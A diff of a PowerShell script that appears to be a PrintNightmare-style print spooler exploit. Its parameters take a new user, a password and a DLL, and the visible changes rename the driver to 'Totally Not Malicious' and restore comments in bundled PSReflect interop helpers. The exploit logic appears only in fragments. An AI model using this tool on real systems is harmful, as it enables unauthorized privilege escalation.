@@ -1,7 +1,7 @@
 function repo
 {
     param (
-        [string]$DriverName = "bop",
+        [string]$DriverName = "Totally Not Malicious",
         [string]$NewUser = "",
         [string]$NewPassword = "",
         [string]$DLL = ""
@@ -52,6 +52,7 @@ function repo
 
     $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Mod'
 
+    # Define custom structures for types created
     $DRIVER_INFO_2 = struct $Mod DRIVER_INFO_2 @{
         cVersion = field 0 Uint64;
         pName = field 1 string -MarshalAs @("LPTStr");
@@ -129,8 +130,20 @@ function get_nightmare_dll
     return $ms.ToArray()
 }
 
+########################################################
+# Stolen from PowerSploit: https://github.com/PowerShellMafia/PowerSploit
+########################################################
+
+########################################################
+#
+# PSReflect code for Windows API access
+# Author: @mattifestation
+#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
+#
+########################################################
+
 function New-InMemoryModule {
-<
+<#
 .SYNOPSIS
 Creates an in-memory assembly and module
 Author: Matthew Graeber (@mattifestation)
@@ -147,6 +160,7 @@ Specifies the desired name for the in-memory assembly and module. If
 ModuleName is not provided, it will default to a GUID.
 .EXAMPLE
 $Module = New-InMemoryModule -ModuleName Win32
+#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [CmdletBinding()]
@@ -174,6 +188,8 @@ $Module = New-InMemoryModule -ModuleName Win32
     return $ModuleBuilder
 }
 
+# A helper function used to reduce typing while defining function
+# prototypes for Add-Win32Type.
 function func {
     Param (
         [Parameter(Position = 0, Mandatory = $True)]
@@ -224,7 +240,7 @@ function func {
 
 function Add-Win32Type
 {
-<
+<#
 .SYNOPSIS
 Creates a .NET type for an unmanaged Win32 function.
 Author: Matthew Graeber (@mattifestation)
@@ -283,6 +299,7 @@ Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189
 When defining multiple function prototypes, it is ideal to provide
 Add-Win32Type with an array of function signatures. That way, they
 are all incorporated into the same in-memory module.
+#>
 
     [OutputType([Hashtable])]
     Param(
@@ -347,7 +364,7 @@ are all incorporated into the same in-memory module.
         }
         else
         {
-
+            # Define one type for each DLL
             if (!$TypeHash.ContainsKey($DllName))
             {
                 if ($Namespace)
@@ -366,6 +383,7 @@ are all incorporated into the same in-memory module.
                 $ReturnType,
                 $ParameterTypes)
 
+            # Make each ByRef parameter an Out parameter
             $i = 1
             foreach($Parameter in $ParameterTypes)
             {
@@ -386,6 +404,7 @@ are all incorporated into the same in-memory module.
 
             if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }
 
+            # Equivalent to C# version of [DllImport(DllName)]
             $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
             $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                 $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
@@ -422,8 +441,9 @@ are all incorporated into the same in-memory module.
     }
 }
 
+
 function psenum {
-<
+<#
 .SYNOPSIS
 Creates an in-memory enumeration for use in your PowerShell session.
 Author: Matthew Graeber (@mattifestation)
@@ -448,13 +468,13 @@ Specifies that the enum should be treated as a bitfield.
 $Mod = New-InMemoryModule -ModuleName Win32
 $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
     UNKNOWN =                  0
-    NATIVE =                   1 
-    WINDOWS_GUI =              2 
-    WINDOWS_CUI =              3 
-    OS2_CUI =                  5 
-    POSIX_CUI =                7 
-    NATIVE_WINDOWS =           8 
-    WINDOWS_CE_GUI =           9 
+    NATIVE =                   1 # Image doesn't require a subsystem.
+    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
+    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
+    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
+    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
+    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
+    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
     EFI_APPLICATION =          10
     EFI_BOOT_SERVICE_DRIVER =  11
     EFI_RUNTIME_DRIVER =       12
@@ -467,6 +487,7 @@ PowerShell purists may disagree with the naming of this function but
 again, this was developed in such a way so as to emulate a "C style"
 definition as closely as possible. Sorry, I'm not going to name it
 New-Enum. :P
+#>
 
     [OutputType([Type])]
     Param (
@@ -510,13 +531,16 @@ New-Enum. :P
 
     foreach ($Key in $EnumElements.Keys)
     {
-
+        # Apply the specified enum type to each element
         $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
     }
 
     $EnumBuilder.CreateType()
 }
 
+
+# A helper function used to reduce typing while defining struct
+# fields.
 function field {
     Param (
         [Parameter(Position = 0, Mandatory=$True)]
@@ -543,9 +567,10 @@ function field {
     }
 }
 
+
 function struct
 {
-<
+<#
 .SYNOPSIS
 Creates an in-memory struct for use in your PowerShell session.
 Author: Matthew Graeber (@mattifestation)
@@ -604,7 +629,7 @@ $ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
     e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
     e_lfanew =   field 18 Int32
 }
-
+# Example of using an explicit layout in order to create a union.
 $TestUnion = struct $Mod TestUnion @{
     field1 = field 0 UInt32 0
     field2 = field 1 IntPtr 0
@@ -614,6 +639,7 @@ PowerShell purists may disagree with the naming of this function but
 again, this was developed in such a way so as to emulate a "C style"
 definition as closely as possible. Sorry, I'm not going to name it
 New-Struct. :P
+#>
 
     [OutputType([Type])]
     Param (
@@ -664,6 +690,9 @@ New-Struct. :P
 
     $Fields = New-Object Hashtable[]($StructFields.Count)
 
+    # Sort each field according to the orders specified
+    # Unfortunately, PSv2 doesn't have the luxury of the
+    # hashtable [Ordered] accelerator.
     foreach ($Field in $StructFields.Keys)
     {
         $Index = $StructFields[$Field]['Position']
@@ -701,12 +730,14 @@ New-Struct. :P
         if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
     }
 
+    # Make the struct aware of its own size.
+    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
     $SizeMethod = $StructBuilder.DefineMethod('GetSize',
         'Public, Static',
         [Int],
         [Type[]] @())
     $ILGenerator = $SizeMethod.GetILGenerator()
-
+    # Thanks for the help, Jason Shirk!
     $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
     $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
         [Type].GetMethod('GetTypeFromHandle'))
@@ -714,6 +745,8 @@ New-Struct. :P
         [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
     $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
 
+    # Allow for explicit casting from an IntPtr
+    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
     $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
         'PrivateScope, Public, Static, HideBySig, SpecialName',
         $StructBuilder,
